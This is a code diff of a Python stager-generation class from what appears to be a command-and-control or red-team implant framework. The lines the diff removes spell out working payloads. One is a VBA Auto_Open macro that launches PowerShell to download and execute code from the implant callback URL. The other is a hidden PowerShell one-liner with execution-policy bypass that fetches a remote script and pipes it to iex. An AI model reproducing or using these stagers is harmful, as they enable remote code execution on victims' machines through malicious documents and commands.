@@ -1,24 +1,29 @@
 from Data.Database import Database
+from NetworkProfiles.NetworkProfileManager import NetworkProfileManager
+
+import ast
 
 
 class StagerGeneration:
     # TODO: This needs cleaned up to ensure expandability with database changes.
-    db = None
 
-    def __init__(self):
-        self.db = Database()
+    db = Database()
+    NetProfMan = NetworkProfileManager()
+
 
     def generate_static_stagers(self, cid, user):
         ret_data = {}
         if self.db.campaign.Verify_UserCanAccessCampaign(user, cid):
             implant_info = self.db.implant.Get_AllImplantBaseFromCid(cid)
+            print(type(implant_info[0]["network_profiles"]))
+            print(implant_info)
             if implant_info is not False:
                 for implant in implant_info:
+
                     ret_data[implant['title']] = {
                         "description": implant['description'],
                         "url": implant['callback_url'],
                         "powershell_stager": self._generate_powershell_stager_string(implant),
-                        # "https_powershell_stager": self.__generate_https_powershell_stager_string(implant),
                         "docm_macro_stager": self._generate_docx_stager_string(implant),
                         "stager_key": implant['stager_key']}
             return ret_data
@@ -35,36 +40,28 @@ class StagerGeneration:
         else:
             return False
 
-    @staticmethod
-    def _generate_docx_stager_string(implant_data):
-
-        if implant_data['comms_https'] == 1:
-            http_proto = "https"
-            port = implant_data['comms_https']
+    def _generate_docx_stager_string(self, implant_data):
+        stager_list = []
+        if 'network_profiles' in implant_data:
+            for element in implant_data['network_profiles']:
+                raw = self.NetProfMan.get_docm_implant_stager(element, implant_data)
+                if raw is not None:
+                    stager_list.append(raw)
+            return stager_list
         else:
-            http_proto = "http"
-            port = implant_data['comms_https']
-        stager_string = f'''Sub Auto_Open()
-Dim exec As String
-exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('{http_proto}://{implant_data['callback_url']}:{port}/robots.txt?user={implant_data['stager_key']}'))"""
-Shell (exec)
-End Sub
-:return:'''
+            return stager_list
 
-        return stager_string
 
-    @staticmethod
-    def _generate_powershell_stager_string(implant_data):
-        if implant_data['comms_https'] == 1:
-            http_proto = "https"
-            port = implant_data['comms_https']
+    def _generate_powershell_stager_string(self, implant_data):
+        # Calls the Network Profile Manager to see if a powershell stager exists, if not the network profile will return
+        #   a None value. Care should be taken to avoid comms which do not have any stager options to generate active
+        #   payloads.
+        stager_list = []
+        if 'network_profiles' in implant_data:
+            for element in implant_data['network_profiles']:
+                raw = self.NetProfMan.get_powershell_implant_stager(element, implant_data)
+                if raw is not None:
+                    stager_list.append(raw)
+            return stager_list
         else:
-            http_proto = "http"
-            port = implant_data['comms_http']
-
-        stager_string = f"powershell -windowstyle hidden -exec bypass -c " \
-                        f"\"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::" \
-                        f"DefaultNetworkCredentials;(iwr '{http_proto}://{implant_data['callback_url']}:{port}" \
-                        f"/robots.txt?user={ implant_data['stager_key']}' -UseBasicParsing)|iex\""
-
-        return stager_string
+            return stager_list
